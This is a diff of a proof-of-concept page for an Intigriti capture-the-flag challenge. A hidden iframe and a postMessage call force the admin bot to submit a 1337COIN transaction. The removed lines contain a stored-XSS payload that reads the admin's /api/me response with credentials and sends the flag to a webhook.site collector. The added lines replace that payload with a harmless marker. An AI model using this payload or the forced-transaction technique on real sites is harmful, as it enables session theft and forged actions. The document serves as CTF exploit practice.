@@ -3,42 +3,33 @@
 <body>
 <script>
 /*
-  Stored-XSS seeding PoC
-  Uses admin bot to create a malicious transaction
+  Phase 1 PoC
+  Goal: Confirm admin bot can create a 1337COIN transaction
 */
 
-const XSS_PAYLOAD = `<svg/onload="
-fetch('/api/me',{credentials:'include'})
-.then(r=>r.json())
-.then(d=>{
-  new Image().src=
-  'https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?flag='+
-  encodeURIComponent(d.flag)
-})
-">`;
+const MARKER = "198fbdef2cae64a978b0998df98e09acbd";
 
-// 1️⃣ Open checkout as admin (hidden iframe)
-const checkout = document.createElement("iframe");
-checkout.style.display = "none";
-checkout.src =
+// 1️⃣ Open checkout as admin
+const iframe = document.createElement("iframe");
+iframe.style.display = "none";
+iframe.src =
   "https://challenge-0126.intigriti.io/checkout.html" +
   "?currency=1337COIN&price=1";
 
-document.body.appendChild(checkout);
+document.body.appendChild(iframe);
 
-// 2️⃣ Wait for checkout to load
+// 2️⃣ Wait for checkout + wallet load
 setTimeout(() => {
-  // 3️⃣ Send malicious transaction via postMessage
-  checkout.contentWindow.postMessage({
+  // 3️⃣ Force transaction submission
+  iframe.contentWindow.postMessage({
     type: "submitTransaction",
     transaction: {
-      // 🔥 Inject XSS into a stored field
-      toAddress: XSS_PAYLOAD,
+      toAddress: MARKER,
       currency: "1337COIN",
       amount: 1
     }
   }, "*");
-}, 4000);
+}, 5000);
 </script>
 </body>
 </html>
